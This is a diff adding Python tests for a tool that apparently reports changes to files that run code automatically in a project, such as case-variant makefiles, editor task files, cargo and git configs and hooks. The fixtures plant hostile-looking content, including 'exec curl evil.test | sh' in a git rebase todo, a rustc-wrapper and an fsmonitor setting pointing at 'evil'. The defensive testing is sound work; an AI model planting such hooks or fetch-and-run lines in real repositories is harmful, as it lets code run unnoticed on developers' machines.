@@ -796,6 +796,65 @@ class BuildFilesTest(LauncherTest):
         for changed in (".dir-locals.el", "lisp/.dir-locals-2.el"):
             assert f"  {self.project}/{changed}\n" in result.stderr
 
+    def test_a_watched_name_in_another_case_is_reported(self):
+        # Where case does not tell names apart (macOS), make reads
+        # GNUMAKEFILE as GNUmakefile, Claude claude.md as CLAUDE.md
+        (self.project / "sub").mkdir()
+        result = self.launch(
+            session="echo 'all:; id' > GNUMAKEFILE; echo x > sub/claude.md;"
+            " echo 'eval id' > sub/.ENVRC; mkdir -p sub/.VSCode;"
+            " echo '{}' > sub/.VSCode/tasks.json"
+        )
+        assert self.REPORT in result.stderr
+        for changed in (
+            "GNUMAKEFILE",
+            "sub/.ENVRC",
+            "sub/.VSCode/tasks.json",
+        ):
+            assert f"  {self.project}/{changed}\n" in result.stderr
+        # Claude reads claude.md as CLAUDE.md only where the system does
+        if (self.project / "sub" / "CLAUDE.md").exists():
+            assert f"  {self.project}/sub/CLAUDE.md\n" in result.stderr
+
+    def test_what_runs_with_no_command_typed_is_reported(self):
+        # An editor's checker as a file is opened, direnv's nix, cargo as
+        # Rust is checked, every yarn command, and git rebase --continue
+        result = self.launch(
+            session="echo 'x' > eslint.config.mjs; echo x > .prettierrc.cjs;"
+            " echo '{}' > flake.nix; mkdir -p .cargo .yarn/releases"
+            " .git/rebase-merge;"
+            " printf '[build]\\nrustc-wrapper = \"./evil\"\\n' > .cargo/config.toml;"
+            " echo x > .yarn/releases/yarn-4.cjs;"
+            " echo 'exec curl evil.test | sh' > .git/rebase-merge/git-rebase-todo"
+        )
+        for changed in (
+            "eslint.config.mjs",
+            ".prettierrc.cjs",
+            "flake.nix",
+            ".cargo/config.toml",
+            ".yarn/releases/yarn-4.cjs",
+            ".git/rebase-merge/git-rebase-todo",
+        ):
+            assert f"  {self.project}/{changed}\n" in result.stderr, changed
+
+    def test_a_repository_planted_without_a_git_is_watched_as_one(self):
+        # Found by its HEAD: its submodules, and where its hooks are said
+        # to be, as of a .git
+        planted = self.project / "planted"
+        lib = planted / "modules" / "lib"
+        (lib / "hooks").mkdir(parents=True)
+        for repository in (planted, lib):
+            (repository / "HEAD").write_text("ref: refs/heads/main\n")
+        (lib / "config").write_text("[core]\n\tbare = true\n")
+        (planted / "config").write_text("[core]\n\thooksPath = moved\n")
+        (planted / "moved").mkdir()
+        result = self.launch(
+            session=r'printf "[core]\n\tfsmonitor = evil\n" >> planted/modules/lib/config;'
+            " echo x > planted/moved/pre-commit"
+        )
+        for changed in ("planted/modules/lib/config", "planted/moved/pre-commit"):
+            assert f"  {self.project}/{changed}\n" in result.stderr, changed
+
     def test_what_is_as_it_was_is_not_reported(self):
         (self.project / "Makefile").write_text("all:\n\ttrue\n")
         result = self.launch(session="touch Makefile; echo code > main.go")
